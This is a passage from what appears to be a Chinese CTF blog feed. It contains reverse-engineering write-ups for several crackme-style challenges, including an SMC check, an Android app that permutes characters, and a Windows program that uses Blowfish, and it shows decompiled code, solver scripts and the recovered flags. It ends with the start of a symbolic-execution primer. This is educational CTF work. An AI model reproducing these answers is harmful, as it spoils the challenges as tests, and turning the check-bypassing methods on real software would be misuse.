class="built_in">sub_7FF72A641262</span>(std::cout, <span class="string">&quot;Try harder&quot;</span>);</span><br><span class="line">     std::ostream::<span class="keyword">operator</span>&lt;&lt;(v10, sub_7FF72A6411FE);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     v9 = <span class="built_in">sub_7FF72A641262</span>(std::cout, <span class="string">&quot;I can&#x27;t believe my golden doge eye! we are comarde!&quot;</span>);</span><br><span class="line">     std::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, sub_7FF72A6411FE);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>打开之后是一组数，通过交叉引用查看这个数据是通过函数生成的，但是没看懂。。。</p><p>看了wp发现这个是SMC，三个check是函数，双击进入对应地址，发现都是数据，这时要c加p组合再f5进入反编译结果检查的值就在这里</p><p><img src="https://s2.loli.net/2023/12/27/o82P7AFzawI6l49.png" alt="image-20231227230725460"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_278FBE97370</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x665F756F795F686F</span>i64 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_278FBEA01C0</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v3[<span class="number">2</span>]; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> v4[<span class="number">12</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">0</span>] = a1;</span><br><span class="line">  qmemcpy(v4, <span class="string">&quot;ound_our&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  v1 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)v3 + v1) == *((_BYTE *)v4 + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v1 &gt;= <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_278FBE999B4</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0x796E6E33785F</span>i64 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接得出结果</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oh_you_fou<span class="symbol">nd_our_x3</span><span class="symbol">nny</span></span><br></pre></td></tr></table></figure><p>总结，如果看到virtulprotect和数据当作地址，尝试把数据改成代码</p><h2 id="NSSCTF-2nd-Bytecode">[NSSCTF 2nd]Bytecode</h2><p>打开后，是py字节码</p><p>反编译一下</p><h1>安洵杯</h1><h2 id="mobilego">mobilego</h2><p>jadx打开mainactivity</p><p>模拟器中尝试输入，返回nonono</p><p>发现判断函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="comment">/* synthetic */</span> <span class="keyword">void</span> m141lambda$onCreate$<span class="number">0</span>$comexamplemobilegoMainActivity(View v) &#123;</span><br><span class="line">        <span class="keyword">if</span> (Game.checkflag(<span class="built_in">this</span>.editText.getText().toString()).equals(getResources().getString(C0569R.string.cmp))) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;yes your flag is right&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;No No No&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在C0569R中有</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">string</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">app_name</span> <span class="operator">=</span> <span class="number">2131689500</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">cmp</span> <span class="operator">=</span> <span class="number">2131689512</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的cmp是它的id值而不是它的具体值</p><p>所以动态调试找到终值</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">49021</span>&#125;<span class="number">5</span>f919038b440139g74b7Dc88330e5d&#123;<span class="number">6</span></span><br></pre></td></tr></table></figure><p>这里使用了Game.checkflag来加密</p><p>所以先看这个</p><p>根据game</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> game;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> p004go.Seq;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Game</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">_init</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">checkflag</span><span class="params">(String str)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Seq.touch();</span><br><span class="line">        _init();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Game</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">touch</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>怀疑checkflag是通过lib加载的</p><p>打开ida，反汇编so文件</p><p>搜索checkflag</p><p>找到5个函数</p><p><img src="https://s2.loli.net/2023/12/28/Z4TbAVSxCklJaOB.png" alt="image-20231228150946781"></p><p>函数是这几个</p><p>好复杂，看不懂。。</p><p>看了看wp，发现一个一直没注意的东西，如果输入</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234567890</span>变为<span class="number">6143580927</span>，</span><br><span class="line">&#123;qwertyuiopasdfghjklzxcvbnm&#125;变为bhgsruc&#123;iojqkdpwnezyvxa&#125;lfmt</span><br></pre></td></tr></table></figure><p>说明这只是字符交换，交换之后是</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">49021</span>&#125;<span class="number">5</span>f919038b440139g74b7Dc88330e5d&#123;<span class="number">6</span></span><br></pre></td></tr></table></figure><p>一共38个字符</p><p>那么尝试输入</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t<span class="number">2</span>F<span class="number">7</span>GTglISYL<span class="symbol">nMzc6</span>CqhD<span class="symbol">N5</span>OdX<span class="number">8</span>wPjsKufVbE&#125;</span><br></pre></td></tr></table></figure><p>变为</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NVLjz&#125;ShscYPndXT62qlDFO5I8tgEKw7ufbMGC</span><br></pre></td></tr></table></figure><p>根据这个对应关系，逆向解出原来的关系</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">d1 = <span class="string">&#x27;t2F7GTglISYLnMzc6CqhDN5OdX8wPjsKufVbE&#125;&#x27;</span></span><br><span class="line">d2 = <span class="string">&#x27;NVLjz&#125;ShscYPndXT62qlDFO5I8tgEKw7ufbMGC&#x27;</span></span><br><span class="line"></span><br><span class="line">f2 = <span class="string">&#x27;49021&#125;5f919038b440139g74b7Dc88330e5d&#123;6&#x27;</span></span><br><span class="line">f1 = <span class="selector-attr">[0]</span>*<span class="number">38</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">        <span class="keyword">if</span> (d2<span class="selector-attr">[j]</span> == d1<span class="selector-attr">[i]</span>):</span><br><span class="line">            f1<span class="selector-attr">[i]</span> = f2<span class="selector-attr">[j]</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(<span class="string">&#x27;&#x27;</span>.join(f1)</span></span>)</span><br><span class="line">#D0g3&#123;<span class="number">4</span>c3b5903d11461f94478b7302980e958&#125;</span><br></pre></td></tr></table></figure><p>总结：</p><p>猜测输入时尽量使用有规律的字符，更容易看清</p><p>如果不容易逆向可以尝试看或者猜</p><h2 id="你见过蓝色的小鲸鱼吗">你见过蓝色的小鲸鱼吗</h2><p>打开文件后，发现是win程序，说明进入主窗口程序和判断函数不一定在一个位置</p><p>所以打开后需要找到判断代码，搜索string无效</p><p>根据弹窗函数是MessageBox，尝试搜索</p><p>然后找到判断函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __thiscall <span class="title function_">lastcall</span><span class="params">(<span class="type">void</span> *this)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> wrong[<span class="number">28</span>]; <span class="comment">// [esp+D0h] [ebp-54h] BYREF</span></span><br><span class="line">  CHAR yes[<span class="number">20</span>]; <span class="comment">// [esp+ECh] [ebp-38h] BYREF</span></span><br><span class="line">  CHAR Caption[<span class="number">24</span>]; <span class="comment">// [esp+100h] [ebp-24h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [esp+118h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = this;</span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_52102F);</span><br><span class="line">  <span class="built_in">strcpy</span>(Caption, <span class="string">&quot;tip&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(yes, <span class="string">&quot;You Get It!&quot;</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(wrong, <span class="string">&quot;Wrong user/passwd&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)v5 + <span class="number">2</span>) != *((_DWORD *)v5 + <span class="number">3</span>)</span><br><span class="line">    || j__memcmp(*(<span class="type">const</span> <span class="type">void</span> **)v5, *((<span class="type">const</span> <span class="type">void</span> **)v5 + <span class="number">1</span>), *((_DWORD *)v5 + <span class="number">3</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> MessageBoxA(<span class="number">0</span>, wrong, Caption, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> MessageBoxA(<span class="number">0</span>, yes, Caption, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的v5+2和v5+3一定指向一个是输入（可能加密了），另一个说不准，因为有一个密码一个用户名</p><p>由于需要进入else分支，所以条件必须为假</p><p>即：</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*((_DWORD *)v5 + <span class="number">2</span>) == *((_DWORD *)v5 + <span class="number">3</span>)</span><br><span class="line">    &amp;&amp; ！j__memcmp<span class="comment">(*(const void **)</span>v5, *((<span class="keyword">const</span> void **)v5 + <span class="number">1</span>), *((_DWORD *)v5 + <span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>既然如此，需要找出能改变v5+2和+3的地址的函数（修改了this），向上找：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [esp+10h] [ebp-154h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [esp+24h] [ebp-140h]</span></span><br><span class="line">  CHAR *v6; <span class="comment">// [esp+114h] [ebp-50h]</span></span><br><span class="line">  CHAR *lpString; <span class="comment">// [esp+120h] [ebp-44h]</span></span><br><span class="line">  HWND DlgItem; <span class="comment">// [esp+12Ch] [ebp-38h]</span></span><br><span class="line">  HWND hWnd; <span class="comment">// [esp+138h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+144h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> WindowTextLengthA; <span class="comment">// [esp+150h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_52105E);</span><br><span class="line">  hWnd = GetDlgItem((HWND)argc, <span class="number">1003</span>);</span><br><span class="line">  DlgItem = GetDlgItem((HWND)argc, <span class="number">1004</span>);</span><br><span class="line">  WindowTextLengthA = GetWindowTextLengthA(hWnd);</span><br><span class="line">  v10 = GetWindowTextLengthA(DlgItem);</span><br><span class="line">  lpString = (CHAR *)j__malloc(__CFADD__(WindowTextLengthA, <span class="number">16</span>) ? <span class="number">-1</span> : WindowTextLengthA + <span class="number">16</span>);</span><br><span class="line">  result = (<span class="type">int</span>)j__malloc(__CFADD__(v10, <span class="number">16</span>) ? <span class="number">-1</span> : v10 + <span class="number">16</span>);</span><br><span class="line">  v6 = (CHAR *)result;</span><br><span class="line">  <span class="keyword">if</span> ( lpString &amp;&amp; result )</span><br><span class="line">  &#123;</span><br><span class="line">    GetWindowTextA(hWnd, lpString, WindowTextLengthA + <span class="number">16</span>);</span><br><span class="line">    GetWindowTextA(DlgItem, v6, v10 + <span class="number">16</span>);</span><br><span class="line">    v5 = operator new(<span class="number">0x10</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_451B43(<span class="number">0x10</span>u);</span><br><span class="line">      v4 = (<span class="type">void</span> *)sub_450CE3(v5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_44FC2B(&amp;unk_51D38C, <span class="number">0x10</span>u);</span><br><span class="line">    sub_45126F(lpString, WindowTextLengthA, (<span class="type">int</span>)v6, v10);</span><br><span class="line">    j_lastcall(v4);</span><br><span class="line">    j__free(lpString);</span><br><span class="line">    j__free(v6);</span><br><span class="line">    result = (<span class="type">int</span>)v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      <span class="keyword">return</span> sub_44F77B(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动调可知：第一个是用户名，第二个是密码</p><p>化简：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [esp+10h] [ebp-154h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [esp+24h] [ebp-140h]</span></span><br><span class="line">  CHAR *password; <span class="comment">// [esp+114h] [ebp-50h]</span></span><br><span class="line">  CHAR *username; <span class="comment">// [esp+120h] [ebp-44h]</span></span><br><span class="line">  HWND DlgItem; <span class="comment">// [esp+12Ch] [ebp-38h]</span></span><br><span class="line">  HWND hWnd; <span class="comment">// [esp+138h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> lenOFpass; <span class="comment">// [esp+144h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> lenOFname; <span class="comment">// [esp+150h] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_52105E);</span><br><span class="line">  hWnd = GetDlgItem((HWND)argc, <span class="number">1003</span>);</span><br><span class="line">  DlgItem = GetDlgItem((HWND)argc, <span class="number">1004</span>);</span><br><span class="line">  lenOFname = GetWindowTextLengthA(hWnd);</span><br><span class="line">  lenOFpass = GetWindowTextLengthA(DlgItem);</span><br><span class="line">  username = (CHAR *)j__malloc(__CFADD__(lenOFname, <span class="number">16</span>) ? <span class="number">-1</span> : lenOFname + <span class="number">16</span>);</span><br><span class="line">  result = (<span class="type">int</span>)j__malloc(__CFADD__(lenOFpass, <span class="number">16</span>) ? <span class="number">-1</span> : lenOFpass + <span class="number">16</span>);</span><br><span class="line">  password = (CHAR *)result;</span><br><span class="line">  <span class="keyword">if</span> ( username &amp;&amp; result )                     <span class="comment">// 检查空指针</span></span><br><span class="line">  &#123;</span><br><span class="line">    GetWindowTextA(hWnd, username, lenOFname + <span class="number">16</span>);<span class="comment">// 用户名</span></span><br><span class="line">    GetWindowTextA(DlgItem, password, lenOFpass + <span class="number">16</span>);<span class="comment">// 密码</span></span><br><span class="line">    v5 = operator new(<span class="number">0x10</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_451B43(<span class="number">0x10</span>u);                        <span class="comment">// 分配内存</span></span><br><span class="line">      v4 = (<span class="type">void</span> *)sub_450CE3(v5);              <span class="comment">// 初始化</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_44FC2B(&amp;specialloc, <span class="number">0x10</span>u);             <span class="comment">// 初始化对象</span></span><br><span class="line">    encode(username, lenOFname, (<span class="type">int</span>)password, lenOFpass);</span><br><span class="line">    j_lastcall(v4);                             <span class="comment">// 判断</span></span><br><span class="line">    j__free(username);</span><br><span class="line">    j__free(password);</span><br><span class="line">    result = (<span class="type">int</span>)v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      <span class="keyword">return</span> sub_44F77B(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面实在分析不出来了，里面有一些涉及c++的理解的</p><p>在后面有加密函数是blowfish</p><p>在cmp时下断点buf1就是最后的值</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11A51F049550E2508F17E16CF1632B47</span><br></pre></td></tr></table></figure><p>写blowfish的解密：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Blowfish</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密文（以十六进制表示）</span></span><br><span class="line">ciphertext_hex = <span class="string">&quot;11A51F049550E2508F17E16CF1632B47&quot;</span></span><br><span class="line">ciphertext = binascii.unhexlify(ciphertext_hex)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密钥（简单字符串）</span></span><br><span class="line">key = <span class="string">&quot;UzBtZTBuZV9EMGcz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建Blowfish ECB模式的解密器</span></span><br><span class="line">cipher = Blowfish.new(key.encode(<span class="string">&#x27;utf-8&#x27;</span>), Blowfish.MODE_ECB)</span><br><span class="line"></span><br><span class="line">plaintext_bytes = cipher.decrypt(ciphertext)</span><br><span class="line">plaintext = plaintext_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br><span class="line"><span class="comment">#QHRoZWJsdWVmMXNo</span></span><br></pre></td></tr></table></figure><p>这个答案是个base64，解密后是@thebluef1sh</p><p>（和蓝鲸的唯一关系吗。。。）</p><p>所以</p><p>D0g3{UzBtZTBuZV9EMGczQHRoZWJsdWVmMXNo}</p>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 杂题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>符号执行简介</title>
      <link href="/posts/54c80afd.html"/>
      <url>/posts/54c80afd.html</url>
      
        <content type="html"><![CDATA[<p>1</p><h2 id="定义">定义</h2><blockquote><p><strong>符号执行</strong>（英语：symbolic execution）是一种<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6">计算机科学</a>领域的<a href="https://zh.wikipedia.org/wiki/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90">程序分析</a>技术，通过采用抽象的符号代替精确值作为程序输入变量，得出每个路径抽象的输出结果。这一技术在硬件、底层程序测试中有一定的应用，能够有效的发现程序中的漏洞。</p></blockquote><h2 id="基本原理">基本原理</h2><p>举例说明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">()</span> &#123;</span><br><span class="line">  y = read();</span><br><span class="line">  z = y * <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span>(z == <span class="number">12</span>)&#123;</span><br><span class="line">    fail();</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;OK&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于以上代码，如果实际执行，那么效果是：读入一个值到y，然后令z等于y的2倍。如果z等于6，调用fail(),反之打印ok。</p><p>对于符号执行来说，流程中不定的值会被赋为$\lambda$,一个符号值，这个值可以是任何值，在这个例子中，y会等于$\lambda$，z会等于2$\lambda$，当遇到分支时，会模拟执行所有分支，即当2$\lambda$等于12时调用fail(),当2$\lambda$不等于12时打印ok。在符号执行完所有的路径后，会计算出一个能完成这个路径的符号的变量实际值，该例中，调用fail()是$\lambda$==6的结果，打印ok是$\lambda$！=6时成立</p><p>上面这个过程中，每一个条件被叫做一个<code>约束</code>，每一个结果对应的所有约束被称为约束集，每一个结果经过的约束集被称为<code>路径</code>，路径可以由执行树表示。而符号执行的目的，就是让符号值遍历所有路径，找到所有对应的约束集。</p><p>为了完成以上工作，在整个流程中存在两个变量<code>符号状态</code>$\sigma$和<code>路径条件</code>$PC$，并根据读到的语句对约束进行添加（以下为例子）：</p><ul><li>若是输入语句，在$\sigma$中添加映射：$\sigma$={var$\rightarrow$$\lambda_0$},此时$\lambda_0$是var变量的符号值。</li><li>若是赋值语句，则把符号值代入计算，在$\sigma$中添加映射：$\sigma$={var$\rightarrow$$\lambda_0$,$var_2$$\rightarrow$$\lambda_0$+7}</li><li>当遇到条件语句if(e) a else b.PC会先更新为PC$\land$$\sigma$(e)表示then,然后创建PC$^`$初始化为PC$\neg$$\land\sigma$(e)表示另一条路径</li><li>如果遇到exit，错误，前后约束矛盾，这一个路径会终止。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
